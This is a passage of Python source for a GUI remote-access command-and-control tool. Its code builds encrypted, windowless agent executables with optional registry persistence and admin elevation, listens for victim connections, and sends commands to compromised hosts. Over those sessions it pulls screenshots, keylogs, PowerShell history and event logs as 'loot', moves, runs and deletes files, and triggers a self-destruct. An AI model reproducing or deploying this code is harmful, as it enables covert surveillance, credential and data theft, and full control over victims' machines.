            self.session_widgets[session_id].destroy()
            del self.session_widgets[session_id]
        if self.selected_session_var.get() == session_id:
            self.selected_session_var.set("")
            self.queue_message("update_tree", [])
            if self.session_widgets:
                first_session_id = next(iter(self.session_widgets))
                self.selected_session_var.set(first_session_id)
                self.on_session_select()

    def on_session_select(self):
        self.list_drives()
    
    def start_payload_generation_thread(self): threading.Thread(target=self.generate_payload, daemon=True).start()

    def generate_payload(self):
        self.generate_button.config(state="disabled", text="Generating...")
        try:
            lhost, lport = self.lhost_entry.get(), self.lport_gen_entry.get()
            if not lhost or not lport:
                messagebox.showerror("Error", "LHOST and LPORT are required.")
                return

            persistence_code = PERSISTENCE_SNIPPET if self.persistence_var.get() == 1 and sys.platform == "win32" else ""
            if self.persistence_var.get() == 1 and sys.platform != "win32":
                messagebox.showwarning("Warning", "Persistence is Windows-only.")

            payload_code = UNIFIED_AGENT_TEMPLATE.replace('{LHOST}', lhost)
            payload_code = payload_code.replace('{LPORT}', str(lport))
            payload_code = payload_code.replace('{PERSISTENCE_CODE}', persistence_code)
            
            if self.generate_exe_var.get() == 1:
                if not CRYPTO_AVAILABLE:
                    messagebox.showerror("Missing Dependency", "pyaes is not installed. Run: pip install pyaes")
                    return
                if not shutil.which("pyinstaller"):
                    messagebox.showerror("Missing Dependency", "PyInstaller not found in system PATH.")
                    return

                self.queue_message("output", "[*] Starting payload generation...\n")
                key, iv = os.urandom(16), os.urandom(16)
                plaintext_bytes = payload_code.encode(); padding_size = 16 - (len(plaintext_bytes) % 16); padded_code = plaintext_bytes + bytes([padding_size]) * padding_size
                aes = pyaes.AESModeOfOperationCBC(key, iv=iv); encrypter = pyaes.Encrypter(aes); ciphertext = encrypter.feed(padded_code); ciphertext += encrypter.feed()
                loader_code = LOADER_STUB_TEMPLATE.format(KEY=base64.b64encode(key).decode(), IV=base64.b64encode(iv).decode(), CIPHERTEXT=base64.b64encode(ciphertext).decode())
                
                temp_dir = "temp_build"; os.makedirs(temp_dir, exist_ok=True); loader_path = os.path.join(temp_dir, "loader.py")
                with open(loader_path, "w", encoding="utf-8") as f: f.write(loader_code)

                self.queue_message("output", "[*] Compiling with PyInstaller...\n")
                pyinstaller_cmd = ['pyinstaller', '--onefile', '--noconsole', '--clean', '--hidden-import=mss', '--hidden-import=zipfile', '--hidden-import=pyaes']
                if sys.platform == "win32":
                    pyinstaller_cmd.extend(['--hidden-import=pynput.keyboard._win32', '--hidden-import=pynput.mouse._win32', '--hidden-import=winreg'])
                    if self.require_admin_var.get() == 1:
                        pyinstaller_cmd.append('--uac-admin')
                    # Add win32com if available
                    if WIN32COM_AVAILABLE:
                        pyinstaller_cmd.append('--hidden-import=win32com')
                elif sys.platform == "linux":
                    pyinstaller_cmd.extend(['--hidden-import=pynput.keyboard._xorg', '--hidden-import=pynput.mouse._xorg'])
                pyinstaller_cmd.append(os.path.basename(loader_path))

                result = subprocess.run(pyinstaller_cmd, capture_output=True, text=True, check=False, cwd=os.path.abspath(temp_dir), encoding='utf-8', errors='ignore')
                
                if result.returncode != 0:
                    self.queue_message("output", f"[!] PyInstaller Error:\n{result.stdout}\n{result.stderr}\n")
                    messagebox.showerror("PyInstaller Error", "Failed to compile.")
                    return

                self.queue_message("output", "[+] Compilation successful.\n")
                exe_name = "loader.exe" if sys.platform == "win32" else "loader"
                final_exe_path = os.path.join(temp_dir, "dist", exe_name)
                
                if not os.path.exists(final_exe_path):
                    messagebox.showerror("Error", "Compiled executable not found!")
                    return

                default_filename, file_types, def_ext = (f"agent_{lhost}_{lport}.exe", [("Executable", "*.exe")], ".exe") if sys.platform == "win32" else (f"agent_{lhost}_{lport}", [("All files", "*")], "")
                
                if (save_path := filedialog.asksaveasfilename(defaultextension=def_ext, initialfile=default_filename, filetypes=file_types)):
                    shutil.move(final_exe_path, save_path)
                    messagebox.showinfo("Success", f"Payload saved to:\n{save_path}")
                shutil.rmtree(temp_dir)
            else:
                if (save_path := filedialog.asksaveasfilename(defaultextension=".py", initialfile=f"agent_{lhost}_{lport}.py", filetypes=[("Python files", "*.py")])):
                    with open(save_path, 'w', encoding='utf-8') as f: f.write(payload_code)
                    messagebox.showinfo("Success", f"Payload saved to {save_path}")

        except Exception as e:
            error_details = f"An unexpected error occurred:\n\nType: {type(e).__name__}\nMessage: {e}\n\nTraceback:\n{traceback.format_exc()}"
            self.queue_message("output", f"[!] PAYLOAD GENERATION FAILED:\n{error_details}\n")
            messagebox.showerror("Generation Error", error_details)
        finally:
            self.generate_button.config(state="normal", text="Generate Payload")
    
    def start_listener_thread(self):
        self.listener_thread = threading.Thread(target=self.listen_for_connections, daemon=True); self.listener_thread.start()
        self.start_button.config(state="disabled"); self.stop_button.config(state="normal"); self.listener_status.config(text="Listening", fg="#00ff00")

    def listen_for_connections(self):
        try:
            port = int(self.listen_port_entry.get())
            self.listener_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.listener_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.listener_socket.bind(('0.0.0.0', port))
            self.listener_socket.listen(5)
            self.queue_message("output", f"[*] Listener started on port {port}\n")
            
            while True:
                conn, addr = self.listener_socket.accept()
                session_id = addr[0] 
                if session_id in self.sessions:
                    self.queue_message("output", f"[*] Re-establishing connection from {session_id}. Replacing old socket.\n")
                    old_conn = self.sessions[session_id].get('conn')
                    if old_conn:
                        try: old_conn.close()
                        except OSError: pass
                else:
                    self.queue_message("add_session", session_id)
                    self.queue_message("output", f"[+] New connection established from: {session_id}\n")
                self.sessions[session_id] = {'conn': conn, 'lock': threading.Lock()}
        except (OSError, ValueError): self.queue_message("output", f"\n[-] Listener stopped.\n")
        except Exception as e: self.queue_message("output", f"\n[-] Listener error: {e}\n")

    def stop_listener(self):
        try:
            if self.listener_socket: self.listener_socket.close()
            for session in self.sessions.values(): session['conn'].close()
        finally:
            self.start_button.config(state="normal"); self.stop_button.config(state="disabled"); self.listener_status.config(text="Offline", fg="#8B0000")
            for session_id in list(self.sessions.keys()): self.queue_message("remove_session", session_id)
            self.sessions.clear()

    def send_shell_command(self, event=None):
        if cmd := self.session_command_entry.get(): self.send_command(cmd)
        self.session_command_entry.delete(0, END)
    
    def send_command(self, command, args=""):
        selected_session = self.selected_session_var.get()
        if not selected_session or selected_session not in self.sessions: 
            messagebox.showerror("Error", "No active session selected.")
            return
        threading.Thread(target=self._send_and_receive, args=(selected_session, command, args), daemon=True).start()

    def _send_and_receive(self, session_id, command, args):
        if session_id not in self.sessions: return
        session = self.sessions[session_id]
        if not session['lock'].acquire(blocking=False):
            self.queue_message("output", "\n[!] Session is busy. Please wait.\n")
            return
        try:
            full_command = f"{command} {args}".strip()
            self.queue_message("output", f"\n[{session_id}]> {full_command}\n")
            
            conn = session['conn']
            conn.sendall(full_command.encode('utf-8'))

            if command == "CMD_SELF_DESTRUCT": return 
            
            # This is the new, robust receiving logic
            # It handles both file-like data (ending in <<EOF>>) and text data (ending in <<EOT>>)
            full_data = b""
            conn.settimeout(60.0)
            while True:
                try:
                    chunk = conn.recv(16384)
                    if not chunk: break
                    full_data += chunk
                    if full_data.endswith(b'<<EOF>>') or full_data.endswith(b'<<EOT>>'):
                        break
                except socket.timeout:
                    self.queue_message("output", f"\n[!] Command '{command}' timed out waiting for response.\n")
                    return

            if full_data.endswith(b'<<EOF>>'):
                # Handle file-like data
                file_map = {
                    "SCREENSHOT": (".png", "screenshot"), "KEYLOGS": (".txt", "keylogs"), 
                    "PS_HISTORY": (".txt", "ps_history"), "EVENT_LOGS": (".zip", "event_logs")
                }
                file_ext, file_prefix = next((v for k, v in file_map.items() if k in command), (".dat", "loot"))
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                file_name = f"{file_prefix}_{session_id}_{timestamp}{file_ext}"
                file_path = os.path.join(self.loot_dir, file_name)
                
                content = full_data.removesuffix(b'<<EOF>>')
                try:
                    decoded = base64.b64decode(content)
                    if decoded.startswith(b"ERROR:"):
                        self.queue_message("output", f"\n[-] Target Error: {decoded.decode('utf-8','ignore')}\n")
                    else:
                        with open(file_path, 'wb') as f: f.write(decoded)
                        self.queue_message("output", f"\n[+] File saved: {file_name}\n")
                except Exception as e:
                    self.queue_message("output", f"\n[-] Error processing file data: {e}\n")

            elif full_data.endswith(b'<<EOT>>'):
                # Handle text-based data
                decoded = full_data.removesuffix(b'<<EOT>>').decode('utf-8', 'ignore')
                is_browse_cmd = command in ["CMD_LIST_DIR", "CMD_LIST_DRIVES"]

                if "ERROR:" in decoded: 
                    self.queue_message("output", f"\n[-] Target Error: {decoded}\n")
                elif is_browse_cmd:
                    self.update_file_browser(decoded)
                elif command == "CMD_DELETE":
                    self.queue_message("output", decoded + "\n")
                    self.browse_path() # Refresh browser after delete
                else: 
                    self.queue_message("output", decoded + "\n")

        except (socket.error, ConnectionResetError): self.handle_session_lost(session_id)
        except Exception as e: self.queue_message("output", f"\n[-] Critical Error in Receiver: {type(e).__name__}: {e}\n{traceback.format_exc()}\n")
        finally:
            if session['lock'].locked(): session['lock'].release()

    def handle_session_lost(self, session_id):
        if session_id in self.sessions:
            self.queue_message("output", f"\n[-] Session {session_id} connection lost.\n")
            del self.sessions[session_id]
            self.queue_message("remove_session", session_id)

    def list_drives(self): self.send_command("CMD_LIST_DRIVES")
    
    def browse_path(self):
        path = self.path_entry.get().strip()
        if not path: 
            self.queue_message("output", "\n[!] Path cannot be empty.\n")
            return
        self.send_command("CMD_LIST_DIR", f'"{path}"')
    
    def on_tree_double_click(self, event):
        if not (item_id := self.tree.focus()): return
        item, item_type, item_name = self.tree.item(item_id), self.tree.item(item_id)['values'][0], self.tree.item(item_id, 'text')
        if item_type in ['Directory', 'Drive']:
            current_path = self.path_entry.get()
            new_path = item_name if item_type == 'Drive' else os.path.join(current_path, item_name)
            self.path_entry.delete(0, END)
            self.path_entry.insert(0, new_path)
            self.browse_path()

    def human_readable_size(self, size_bytes_str):
        if not size_bytes_str.strip().isdigit(): return ""
        size_bytes = int(size_bytes_str)
        if size_bytes == 0: return "0 B"
        size_names = ("B", "KB", "MB", "GB", "TB"); i = int(math.floor(math.log(size_bytes, 1024))) if size_bytes > 0 else 0
        p = math.pow(1024, i); s = round(size_bytes / p, 2)
        return f"{s} {size_names[i]}"

    def update_file_browser(self, response_text):
        items = []
        for line in response_text.strip().splitlines():
            if not line or line.isspace(): continue
            try:
                name, item_type, size_str = line.split('|')
                items.append({"name": name, "type": item_type, "size": self.human_readable_size(size_str)})
            except ValueError: continue
        self.queue_message("update_tree", items)
            
    def download_file(self):
        if not self.selected_session_var.get(): return
        if not (item_id := self.tree.focus()): return
        item = self.tree.item(item_id)
        if item['values'][0] != 'File': return
        filename = item['text']
        remote_path = os.path.join(self.path_entry.get(), filename).replace('/', '\\')
        threading.Thread(target=self._handle_download, args=(self.selected_session_var.get(), remote_path, filename), daemon=True).start()

    def _handle_download(self, session_id, remote_path, filename):
        if session_id not in self.sessions: return
        session = self.sessions[session_id]
        
        if not session['lock'].acquire(blocking=True, timeout=5): 
            self.queue_message("output", "\n[!] Session busy, download cancelled.\n")
            return
        try:
            conn = session['conn']
            self.queue_message("output", f"[*] Downloading {remote_path}...\n")
            conn.sendall(f"CMD_DOWNLOAD \"{remote_path}\"".encode())
            header = b""
            conn.settimeout(10)
            while not (header.endswith(b'<<EOT>>')):
                header += conn.recv(1024)
            
            header_str = header.removesuffix(b'<<EOT>>').decode()

            if header_str.startswith("FILE_OK:"):
                filesize = int(header_str.split(':')[1])
                local_path = os.path.join(self.loot_dir, os.path.basename(filename))
                self.queue_message("output", f"[+] Receiving {self.human_readable_size(str(filesize))} -> {local_path}\n")
                with open(local_path, 'wb') as f:
                    bytes_received = 0
                    while bytes_received < filesize:
                        chunk = conn.recv(4096)
                        if not chunk: break
                        f.write(chunk); bytes_received += len(chunk)
                self.queue_message("output", "[+] Download complete.\n")
            else: 
                self.queue_message("output", f"[!] Target Error: {header_str}\n")
        except Exception as e:
            self.queue_message("output", f"\n[!] Download failed: {e}\n")
            self.handle_session_lost(session_id)
        finally: 
            if session['lock'].locked(): session['lock'].release()

    def upload_file(self):
        if not self.selected_session_var.get(): return
        if not (local_path := filedialog.askopenfilename(title="Select file to upload")): return
        remote_dir = self.path_entry.get() or ('C:\\\\' if sys.platform == 'win32' else '/')
        initial_remote_path = os.path.join(remote_dir, os.path.basename(local_path))
        if not (remote_path := simpledialog.askstring("Input", "Enter full remote path for upload:", initialvalue=initial_remote_path)): return
        threading.Thread(target=self._handle_upload, args=(self.selected_session_var.get(), local_path, remote_path), daemon=True).start()

    def _handle_upload(self, session_id, local_path, remote_path):
        if session_id not in self.sessions: return
        session = self.sessions[session_id]
        if not session['lock'].acquire(blocking=True, timeout=5): 
            self.queue_message("output", "\n[!] Session busy, upload cancelled.\n")
            return
        try:
            conn = session['conn']; filesize = os.path.getsize(local_path)
            self.queue_message("output", f"[*] Uploading to {remote_path}...\n")
            conn.sendall(f"CMD_UPLOAD {remote_path}:{filesize}".encode())
            
            response = conn.recv(1024)
            if response == b"UPLOAD_READY":
                self.queue_message("output", "[+] Target ready. Sending file...\n")
                with open(local_path, 'rb') as f:
                    while (chunk := f.read(4096)): conn.sendall(chunk)
                
                final_response = b""
                conn.settimeout(10)
                while not final_response.endswith(b'<<EOT>>'):
                    final_response += conn.recv(1024)
                
                self.queue_message("output", f"[+] {final_response.removesuffix(b'<<EOT>>').decode()}\n")
                self.browse_path()
            else: 
                self.queue_message("output", "[!] Target did not respond correctly.\n")
        except Exception as e:
            self.queue_message("output", f"\n[!] Upload failed: {e}\n")
            self.handle_session_lost(session_id)
        finally: 
            if session['lock'].locked(): session['lock'].release()

    def execute_file(self):
        if not (item_id := self.tree.focus()): return
        item = self.tree.item(item_id)
        if item['values'][0] != 'File': return
        filename = item['text']
        remote_path = os.path.join(self.path_entry.get(), filename)
        self.send_command("CMD_EXECUTE", f'"{remote_path}"')

    def delete_item(self):
        if not (item_id := self.tree.focus()): 
            messagebox.showerror("Error", "No item selected in the file browser.")
            return
        item_name = self.tree.item(item_id)['text']
        remote_path = os.path.join(self.path_entry.get(), item_name).replace('/', '\\')

        if messagebox.askyesno("Confirm Deletion", f"Are you sure you want to permanently delete the following item on the target machine?\n\n{remote_path}\n\nThis action cannot be undone."):
            self.send_command("CMD_DELETE", f'"{remote_path}"')

    def confirm_self_destruct(self):
        if not self.selected_session_var.get():
            messagebox.showerror("Error", "No session selected.")
            return
        
        warning_message = (
            "WARNING: This will remove the payload from the target machine.\n\n"
            "This action attempts to:\n"
            "  - Delete the persistence registry key.\n"
            "  - Delete the payload executable.\n"
            "  - Delete associated files (keylogs, etc.).\n\n"
            "You will lose access permanently. This cannot be undone.\n\n"
            "Proceed with self-destruction?"
        )
        
        if messagebox.askyesno("Confirm Self-Destruct", warning_message, icon='warning'):
            self.queue_message("output", "[!] Sending self-destruct command... Connection will be lost.\n")
            self.send_command("CMD_SELF_DESTRUCT")

if __name__ == "__main__":
    app = C2Framework()
    app.mainloop()